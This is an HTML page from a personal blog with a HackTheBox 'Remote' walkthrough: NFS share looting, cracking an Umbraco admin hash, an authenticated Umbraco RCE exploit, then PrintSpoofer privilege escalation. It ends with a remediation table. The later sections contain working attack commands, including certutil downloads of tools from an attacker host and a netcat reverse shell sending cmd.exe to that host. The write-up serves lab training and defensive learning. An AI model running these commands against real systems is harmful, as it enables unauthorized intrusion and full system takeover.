@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Remote - HackTheBox writeup</title>
+<meta name="description" content="HackTheBox Remote (Easy, Windows): an exposed NFS share leaks an Umbraco backup containing an admin hash; cracked, it unlocks the Umbraco backoffice for an authenticated RCE as a service account, then SeImpersonatePrivilege is abused with PrintSpoofer to reach SYSTEM.">
+<link rel="canonical" href="https://sudoanthony.github.io/writeup-remote.html">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="~/sudoanthony">
+<meta property="og:title" content="Remote - HackTheBox (Easy, Windows)">
+<meta property="og:description" content="An exposed NFS share leaks an Umbraco admin hash; cracked, it gives an authenticated RCE foothold, then SeImpersonatePrivilege is abused with PrintSpoofer to reach SYSTEM.">
+<meta property="og:url" content="https://sudoanthony.github.io/writeup-remote.html">
+<meta property="og:image" content="https://sudoanthony.github.io/images/remote-og.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Remote - HackTheBox (Easy, Windows)">
+<meta name="twitter:description" content="Exposed NFS backup leaks an Umbraco admin hash, cracked for an authenticated RCE foothold, then PrintSpoofer abuses SeImpersonatePrivilege for SYSTEM.">
+<meta name="twitter:image" content="https://sudoanthony.github.io/images/remote-og.png">
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<nav class="nav"><div class="wrap">
+  <a class="brand" href="index.html">~/sudoanthony</a>
+  <div class="links">
+    <a href="writeups.html">write-ups</a>
+    <a href="vulns.html">vulns</a>
+    <a href="concepts.html">concepts</a>
+    <a href="tools.html">tools</a>
+    <a href="https://github.com/sudoanthony">github</a>
+  </div>
+</div></nav>
+
+<main class="wrap" style="padding-top:44px">
+
+  <div class="wu-head">
+    <img class="wu-icon" src="images/icons/remote.png" alt="" onerror="this.style.display='none'">
+    <h1>Remote</h1>
+  </div>
+
+  <div class="meta">
+    <span class="badge htb">HackTheBox</span>
+    <span class="badge easy">Easy</span>
+    <span class="badge red-team">red team</span>
+    <span class="sep">|</span>
+    <span>Windows &middot; NFS &middot; web</span>
+    <span class="sep">|</span>
+    <span>13 Oct 2026</span>
+  </div>
+
+  <div class="tldr">
+    <span class="lbl">tl;dr</span>
+    <p>Remote hides its foothold in an <strong>exposed NFS share</strong>. The share holds a full Umbraco
+    site backup, and inside it the Umbraco database (<code>Umbraco.sdf</code>) leaks the admin account's
+    SHA1 hash, which cracks to a weak password. Those credentials unlock the Umbraco backoffice, where the
+    old 7.12.4 version has an <strong>authenticated RCE</strong>, landing a shell as the IIS service account.
+    That account holds <code>SeImpersonatePrivilege</code>, so a "Potato" attack (<strong>PrintSpoofer</strong>)
+    escalates to SYSTEM.</p>
+  </div>
+
+  <div class="tags">
+    <a class="tag" href="vulns.html#nfs-exposed-share">nfs-exposed-share</a>
+    <a class="tag" href="vulns.html#exposed-credentials">exposed-credentials</a>
+    <a class="tag" href="vulns.html#umbraco-rce">umbraco-rce</a>
+    <a class="tag" href="vulns.html#seimpersonate">seimpersonate</a>
+    <a class="tag" href="vulns.html#priv-esc">priv-esc</a>
+  </div>
+
+  <div class="note warn">
+    <span class="lbl">how we ran this one: adventure mode</span>
+    We ran Remote timed and blind - no prior notes or walkthroughs read, no hints unless stuck on a single
+    step for an hour or so, aiming to root it in under four hours. That means this writeup keeps the real
+    path, dead ends and mistakes included, rather than a clean hindsight route. It's more honest about what
+    solving a box actually looks like.
+  </div>
+
+  <hr>
+
+  <!-- ==================== 01 ==================== -->
+  <h2><span class="num">01</span>Enumeration</h2>
+
+  <p>Full port and service scan first:</p>
+  <pre><code><span class="p">$</span> nmap -Pn -p- --min-rate 5000 <span class="o">10.129.230.172</span></code></pre>
+  <figure><img src="images/Remote/remote01.png" alt="nmap showing FTP, HTTP, RPC/NFS, SMB, WinRM"><figcaption>A big surface: 21 (FTP), 80 (HTTP), 111 + 2049 (<strong>RPC/NFS</strong>), 135/139/445 (SMB), 5985 (WinRM). A Windows host.</figcaption></figure>
+
+  <p>We work each service in turn:</p>
+  <ul>
+    <li><strong>FTP (21)</strong> allows anonymous login, but logging in (and curling it from outside)
+    turns up an empty directory. Dead end.</li>
+    <li><strong>HTTP (80)</strong> is an "ACME Widgets" site. Clicking through the pages, reading source,
+    and Wappalyzer tell us it's <strong>Umbraco</strong> (ASP.NET CMS) with the backoffice at
+    <code>/umbraco</code>. We poke the login forms (a contact form leads us to one via Burp), try
+    <code>admin</code> and junk users, look for <code>robots.txt</code> and anything in source, and read
+    up on the jQuery UI / moment.js CVEs the stack exposes. None of it is the way in - the login just
+    rejects us without credentials.</li>
+    <li><strong>SMB (445)</strong> via <code>enum4linux-ng</code> gives no null or guest session, but does
+    confirm the host is <strong>Windows Server 2019</strong>, named REMOTE.</li>
+  </ul>
+
+  <p>The ports we hadn't touched yet were <strong>111 / 2049</strong>, which <code>nmap</code> flagged as
+  <code>rpcbind</code> and <code>nfs</code>. NFS on a Windows box is unusual and worth a close look.</p>
+
+  <hr>
+
+  <!-- ==================== 02 ==================== -->
+  <h2><span class="num">02</span>Looting the NFS share</h2>
+
+  <p>List the exported NFS shares:</p>
+  <pre><code><span class="p">$</span> showmount -e <span class="o">10.129.230.172</span></code></pre>
+  <figure><img src="images/Remote/remote21.png" alt="showmount listing /site_backups exported to everyone"><figcaption><code>/site_backups</code> is exported to <strong>everyone</strong> - no authentication.</figcaption></figure>
+
+  <p>Mount it locally and look around:</p>
+  <pre><code><span class="p">$</span> sudo mount -t nfs <span class="o">10.129.230.172</span>:/site_backups ./Remote-1 -o nolock</code></pre>
+
+  <p>It's a complete Umbraco site backup. <code>Web.config</code> confirms the version and (as a bonus) holds
+  a <code>machineKey</code>, an alternative ViewState-deserialization path we noted but didn't need:</p>
+  <figure><img src="images/Remote/remote23.png" alt="Web.config showing umbracoConfigurationStatus 7.12.4"><figcaption>Umbraco <strong>7.12.4</strong> - an old, known-vulnerable version.</figcaption></figure>
+
+  <p>Digging into <code>App_Data</code>, the real prize is the Umbraco database file:</p>
+  <figure><img src="images/Remote/remote25.png" alt="App_Data directory listing showing Umbraco.sdf"><figcaption><code>Umbraco.sdf</code> - the embedded SQL CE database, which stores the backoffice users.</figcaption></figure>
+
+  <p>No need for a special client - <code>strings</code> pulls the credentials straight out, and the trace
+  logs had already given us the admin's email (<code>admin@htb.local</code>):</p>
+  <pre><code><span class="p">$</span> strings Umbraco.sdf | grep -i admin</code></pre>
+  <figure><img src="images/Remote/remote26.png" alt="strings on Umbraco.sdf revealing the admin SHA1 hash"><figcaption>The admin account: <code>admin@htb.local</code> with an <strong>SHA1</strong> hash and <code>smith@htb.local</code> alongside it.</figcaption></figure>
+
+  <div class="note insight">
+    <span class="lbl">why this is the finding</span>
+    Backups are a classic place for secrets to leak, and an NFS share exported to <em>everyone</em> hands
+    this one to anyone on the network. The database stores passwords as <strong>unsalted SHA1</strong> (fast
+    and crackable), so recovering the plaintext is just a rockyou run away.
+  </div>
+
+  <hr>
+
+  <!-- ==================== 03 ==================== -->
+  <h2><span class="num">03</span>Foothold - crack the hash, then Umbraco RCE</h2>
+
+  <p>We tried <code>hashcat</code> first but our VM has no GPU/OpenCL, so we switched to <code>john</code>,
+  which cracks the unsalted SHA1 against rockyou instantly:</p>
+  <pre><code><span class="p">$</span> echo 'b8be16afba8c314ad33d812f22a04991b90e2aaa' > hash.txt
+<span class="p">$</span> john --format=raw-sha1 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</code></pre>
+  <figure><img src="images/Remote/remote28.png" alt="john cracking the SHA1 hash to baconandcheese"><figcaption>Cracked: <code>baconandcheese</code>.</figcaption></figure>
+
+  <p>Those credentials log straight into the Umbraco backoffice:</p>
+  <figure><img src="images/Remote/remote29.png" alt="logged into the Umbraco backoffice"><figcaption>Authenticated as <code>admin@htb.local</code> in the Umbraco backoffice.</figcaption></figure>
+
+  <p>Umbraco 7.12.4 has a well-known <strong>authenticated RCE</strong> (CVE-2019-25137). We used the noraj
+  <a href="https://github.com/noraj/Umbraco-RCE" target="_blank">Umbraco-RCE</a> exploit, first confirming
+  code execution with a harmless command:</p>
+  <pre><code><span class="p">$</span> python3 ./pkfire.py -u admin@htb.local -p baconandcheese -i http://<span class="o">10.129.230.172</span> -c ipconfig</code></pre>
+  <figure><img src="images/Remote/remote31.png" alt="Umbraco RCE returning ipconfig output"><figcaption>Command execution confirmed - the exploit runs <code>ipconfig</code> on the target.</figcaption></figure>
+
+  <p>To turn that into a shell, we base64-encode a PowerShell reverse shell (UTF-16LE, the format
+  <code>-EncodedCommand</code> expects), start a listener, and run it through the exploit as
+  <code>powershell.exe -EncodedCommand ...</code>:</p>
+  <pre><code><span class="p">$</span> echo -n '&lt;reverse-shell&gt;' | iconv -t UTF-16LE | base64 -w0
+<span class="p">$</span> python3 ./pkfire.py -u admin@htb.local -p baconandcheese -i http://<span class="o">10.129.230.172</span> -c powershell.exe -a '-NoProfile -EncodedCommand &lt;BASE64&gt;'</code></pre>
+  <figure><img src="images/Remote/remote35.png" alt="reverse shell as iis apppool defaultapppool"><figcaption>Shell as the IIS service account, <code>iis apppool\defaultapppool</code>.</figcaption></figure>
+
+  <hr>
+
+  <!-- ==================== 04 ==================== -->
+  <h2><span class="num">04</span>Privilege escalation - SeImpersonate to SYSTEM</h2>
+
+  <p>First thing on any Windows shell, check the privileges:</p>
+  <pre><code><span class="p">PS></span> whoami /priv</code></pre>
+  <figure><img src="images/Remote/remote33.png" alt="whoami /priv showing SeImpersonatePrivilege enabled"><figcaption><code>SeImpersonatePrivilege</code> is <strong>Enabled</strong> - on a service account, that is effectively a direct line to SYSTEM.</figcaption></figure>
+
+  <div class="note insight">
+    <span class="lbl">SeImpersonate and the "Potato" family</span>
+    Service accounts like <code>defaultapppool</code> hold <code>SeImpersonatePrivilege</code> so they can
+    act on behalf of users who connect to them, which is normal. The abuse: if we can <em>coerce</em> a
+    SYSTEM-level service into authenticating to something we control, we can impersonate its token and
+    spawn a process as SYSTEM. The "Potato" tools (PrintSpoofer, JuicyPotato, RoguePotato, GodPotato) all do
+    this, differing in <em>how</em> they trigger the callback. Seeing <code>SeImpersonate</code> enabled on a
+    service account basically means privesc is solved - we just pick the variant that fits the Windows
+    version and open ports. (Full breakdown on the <a href="windows-ad.html#seimpersonate">concepts page</a>.)
+  </div>
+
+  <p>Our first pick was <strong>RogueWinRM</strong> - and it did nothing. Re-reading the tool shows us why:
+  it fakes a WinRM service by listening on <strong>port 5985</strong>, but <code>nmap</code> showed 5985 is
+  already in use (WinRM is running). Lesson learned: read the whole exploit before firing it. HackTricks
+  points us to <strong>PrintSpoofer</strong>, which abuses the Print Spooler instead and has no such
+  conflict.</p>
+
+  <p>Because PrintSpoofer needs to launch a process that calls back, we staged both a netcat binary and
+  PrintSpoofer onto the target with <code>certutil</code>:</p>
+  <pre><code><span class="p">PS></span> certutil -urlcache -split -f http://<span class="o">10.10.15.114</span>/nc.exe C:\Windows\Temp\nc.exe
+<span class="p">PS></span> certutil -urlcache -split -f http://<span class="o">10.10.15.114</span>/PrintSpoofer64.exe C:\Windows\Temp\PrintSpoofer64.exe</code></pre>
+  <figure><img src="images/Remote/remote42.png" alt="RogueWinRM attempts doing nothing, then PrintSpoofer downloaded"><figcaption>The dead RogueWinRM attempts, then pivoting to staging PrintSpoofer.</figcaption></figure>
+
+  <p>Start a listener on a fresh port, then have PrintSpoofer launch netcat back to it as SYSTEM:</p>
+  <pre><code><span class="p">$</span> nc -lvnp 4445   <span class="c"># on Kali</span>
+<span class="p">PS></span> C:\Windows\Temp\PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe <span class="o">10.10.15.114</span> 4445 -e cmd.exe"</code></pre>
+  <figure><img src="images/Remote/remote43.png" alt="PrintSpoofer firing successfully"><figcaption>PrintSpoofer finds <code>SeImpersonatePrivilege</code>, listens on a named pipe, and <code>CreateProcessAsUser()</code> succeeds.</figcaption></figure>
+  <figure><img src="images/Remote/remote44.png" alt="SYSTEM shell caught on the listener"><figcaption>The callback lands as <strong>nt authority\system</strong>.</figcaption></figure>
+
+  <p>From SYSTEM, both flags are trivial:</p>
+  <pre><code>C:\> type C:\Users\Public\Desktop\user.txt        <span class="c"># [redacted]</span>
+C:\> type C:\Users\Administrator\Desktop\root.txt</code></pre>
+  <figure><img src="images/Remote/remote45.png" alt="root.txt flag (redacted)"><figcaption>Root flag - <code>root.txt</code> [redacted]. Box owned.</figcaption></figure>
+
+  <hr>
+
+  <!-- ==================== 05 ==================== -->
+  <h2><span class="num">05</span>Root cause &amp; remediation</h2>
+  <table style="width:100%; border-collapse:collapse; font-size:14.5px; margin:6px 0 8px">
+    <tbody>
+      <tr style="border-bottom:1px solid var(--border)">
+        <td style="padding:11px 12px 11px 0; color:var(--text); width:40%"><strong>NFS share exported to everyone</strong></td>
+        <td style="padding:11px 0; color:var(--text-3)">Restrict NFS exports to specific hosts and authenticated users; never export a backup containing secrets to <code>everyone</code>. Keep backups off network-reachable paths entirely.</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border)">
+        <td style="padding:11px 12px 11px 0; color:var(--text)"><strong>Weak, unsalted password hash</strong></td>
+        <td style="padding:11px 0; color:var(--text-3)">SHA1 is fast and unsalted here, so it falls to a wordlist. Use a slow, salted algorithm (bcrypt/PBKDF2), enforce strong passwords, and rotate any credential that ever touched a backup.</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border)">
+        <td style="padding:11px 12px 11px 0; color:var(--text)"><strong>Outdated Umbraco (authenticated RCE)</strong><br><span style="color:var(--text-4);font-size:13px">7.12.4 / CVE-2019-25137</span></td>
+        <td style="padding:11px 0; color:var(--text-3)">Patch the CMS to a supported release and restrict backoffice access (network ACLs, MFA) so a single leaked credential isn't instant code execution.</td>
+      </tr>
+      <tr>
+        <td style="padding:11px 12px 11px 0; color:var(--text)"><strong>SeImpersonate on a service account</strong></td>
+        <td style="padding:11px 0; color:var(--text-3)">The privilege is required for IIS to function, so the real fix is defense in depth: patch Potato vectors, disable the Print Spooler where it isn't needed, and contain the web app so RCE is harder to reach in the first place.</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <hr>
+
+  <!-- ==================== 06 ==================== -->
+  <h2><span class="num">06</span>Takeaways</h2>
+  <p>Remote is a good reminder to enumerate <em>every</em> service, not just the obvious web port. The whole
+  box opens up through <strong>NFS</strong>, a service easy to skip past on a Windows host, and the loot is a
+  backup that should never have been reachable. When the web front door is locked, the way in was a side
+  door nobody thought to close.</p>
+  <p>The privesc half gave us a concrete lesson worth burning into our notes: <strong>read the whole exploit
+  before we run it.</strong> RogueWinRM silently did nothing because it needs port 5985 free, which the nmap
+  scan had already told us it wasn't. Matching the tool to the target's actual conditions (Windows version,
+  open ports) is the difference between a working Potato attack and ten minutes of confusion.</p>
+  <p>And the pattern worth burning in: the instant <code>whoami /priv</code> shows <code>SeImpersonate</code>
+  enabled on a service account, root is basically a formality.</p>
+
+  <p style="margin-top:32px">
+    <a href="writeups.html">&larr; all write-ups</a> &nbsp;&middot;&nbsp;
+    <a href="vulns.html">techniques used &rarr;</a>
+  </p>
+
+</main>
+
+<footer class="foot"><div class="wrap" style="display:flex;gap:18px;flex-wrap:wrap">
+  <a href="index.html">home</a>
+  <a href="writeups.html">write-ups</a>
+  <a href="vulns.html">vulns</a>
+  <a href="https://github.com/sudoanthony">github</a>
+</div></footer>
+
+<script src="writeup-toc.js"></script>
+<script src="lightbox.js"></script>
+</body>
+</html>
